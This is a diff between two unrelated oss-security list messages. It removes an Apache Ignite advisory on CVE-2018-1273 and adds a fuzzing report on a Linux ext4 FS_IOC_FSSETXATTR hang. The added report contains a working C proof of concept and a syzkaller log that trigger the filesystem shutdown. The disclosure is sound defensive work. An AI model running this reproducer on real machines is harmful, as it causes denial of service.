@@ -1,52 +1,51 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/07/19/1
-Message-ID: <CAK0qHnqzfzmCDFFi6c5Jok19zNkVCz5Xb4sU=0f2J_1i4p46zQ@mail.gmail.com>
-Date: Thu, 19 Jul 2018 10:04:16 -0700
-From: Denis Magda <dmagda@...che.org>
-To: announce@...che.org, security@...ite.apache.org,  Apache Security Team <security@...che.org>, "Rai, Harendra" <harendra.rai@....com>,  oss-security@...ts.openwall.com
-Cc: user@...ite.apache.org, dev <dev@...ite.apache.org>
-Subject: [CVE-2018-1273] Apache Ignite impacted by security vulnerability in Spring Data Commons
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/08/28/3
+Message-ID: <FDE8244F9EEE7E4F8308F32BD3BEDF01BF9E4799@EXMBX-TJ008.tencent.com>
+Date: Tue, 28 Aug 2018 08:27:50 +0000
+From: zhrzhang(张洪睿) <zhrzhang@...cent.com>
+To: oss-security <oss-security@...ts.openwall.com>
+Subject: Linux kernel: FS_IOC_FSSETXATTR will lead to EXT4-fs shut down
 Content-Type: text/plain; charset=utf-8
 
-Severity: Important
+Hello：
+        when I fuzz，I found the kernel will always no output from machine, and error FS_IOC_FSSETXATTR contribute to this.
 
-Vendor: The Apache Software Foundation
+        the syzlog is as below:
 
-Versions Affected:
+r0 = creat(&(0x7f0000000140)='./file0\x00', 0x0)
+ioctl$FS_IOC_FSSETXATTR(r0, 0x8004587d, &(0x7f0000000080)={0x0, 0x0, 0x0, 0x8})
 
-* Apache Ignite 1.0.0-RC3 to 2.5
+        the poc will show like this:
 
-Impact:
+#define _GNU_SOURCE
 
-An unauthenticated remote malicious user (or attacker) can issue requests
-against Spring Data REST or Spring Data
+#include <endian.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <unistd.h>
 
-Description:
+uint64_t r[1] = {0xffffffffffffffff};
 
-Apache Ignite utilizes Spring Data Common library for some of its
-components. The vulnerability affects Apache Ignite users who us Spring
-Data REST for
-access an Ignite cluster via HTTP and Spring Data. Spring Data Commons,
-versions prior to 1.13 to 1.13.10, 2.0 to 2.0.5, and older unsupported
-versions, contain a property binder vulnerability caused by improper
-neutralization of special elements. An unauthenticated remote malicious
-user (or attacker) can supply specially crafted request parameters against
-Spring Data REST backed HTTP resources or using Spring Data's
-projection-based request payload binding hat can lead to a remote code
-execution attack.
-
-Mitigation:
-
-* Upgrade to Apache Ignite 2.6 or later that include Spring Data Commons
-versions not vulnerable to the disclosed issue.
-
-Credit:
-* Harendra Rai of NCR Corporation discovered the impact of the existing
-vulnerability on Apache Ignite.
-
-
-References:
-
-* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1273
-* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1274
-
+int main(void)
+{
+syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
+long res = 0;
+memcpy((void*)0x20000140, "./file0", 8);
+res = syscall(__NR_creat, 0x20000140, 0);
+if (res != -1)
+r[0] = res;
+*(uint32_t*)0x20000080 = 0;
+*(uint32_t*)0x20000084 = 0;
+*(uint32_t*)0x20000088 = 0;
+*(uint32_t*)0x2000008c = 8;
+*(uint32_t*)0x20000090 = 0;
+*(uint64_t*)0x20000098 = 0;
+syscall(__NR_ioctl, r[0], 0x8004587d, 0x20000080);
+return 0;
+}
+________________________________
+zhrzhang(张洪睿)
